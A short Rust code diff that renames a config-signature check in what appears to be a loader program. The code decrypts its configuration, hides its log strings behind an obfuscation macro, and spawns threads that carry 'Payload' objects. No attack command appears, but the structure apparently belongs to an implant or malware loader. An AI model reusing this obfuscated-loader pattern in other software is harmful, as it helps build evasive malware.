@@ -53,7 +53,7 @@ fn main() {
     let mut config: Config = serde_json::from_slice(decrypted_conf.as_slice()).unwrap();
     info!("{}", lc!("[+] VERIFY initial config"));
     debug!("{:?}", &config);
-    config.verify_newloader_sign(&config).unwrap();
+    config.verify_newconfig_signature(&config).unwrap();
     info!("{}{}", lc!("[+] VERIFIED!"), "\n");
 
     let mut running_thread: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
